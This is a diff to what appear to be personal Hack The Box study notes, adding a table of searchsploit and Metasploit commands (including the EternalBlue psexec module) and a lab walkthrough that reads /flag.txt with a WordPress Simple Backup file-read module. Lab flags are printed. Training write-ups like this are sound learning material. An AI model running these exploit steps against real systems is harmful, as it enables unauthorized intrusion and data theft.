@@ -140,3 +140,49 @@ Target: `154.57.164.80:32036`
 5. Logged in and retrieved the flag
 
 > ✅ Flag: `HTB{w3b_3num3r4710n_r3v34l5_53cr375}`
+
+---
+
+## 🔍 Public Exploits
+
+### Commands Reference
+
+| Command | Description |
+|---|---|
+| `searchsploit openssh 7.2` | Search for public exploits for a service/app |
+| `msfconsole` | Start the Metasploit Framework |
+| `search exploit eternalblue` | Search for public exploits in MSF |
+| `use exploit/windows/smb/ms17_010_psexec` | Load an MSF module |
+| `show options` | Show required options for the loaded module |
+| `set RHOSTS 10.10.10.40` | Set a value for a module option |
+| `check` | Test if the target is vulnerable |
+| `exploit` | Run the exploit |
+
+### Lab
+
+**Q: Identify services running on the target, find a public exploit, and read `/flag.txt`.**
+
+**Steps taken:**
+
+1. Scanned the target and identified a WordPress service with **Simple Backup plugin v2.7.10**
+2. Searched MSF for a matching module:
+```bash
+search wordpress 2.7.10
+# Found: auxiliary/scanner/http/wp_simple_backup_file_read
+```
+
+3. Loaded and configured the module:
+```bash
+use 0
+set RHOSTS 154.57.164.68
+set RPORT 32095
+set FILEPATH flag.txt
+exploit
+```
+
+4. MSF saved the output to `~/.msf4/loot/` — read it with:
+```bash
+cat 20260402045240_default_154.57.164.68_simplebackup.tra_445157.txt
+```
+
+> ✅ Flag: `HTB{my_f1r57_h4ck}`
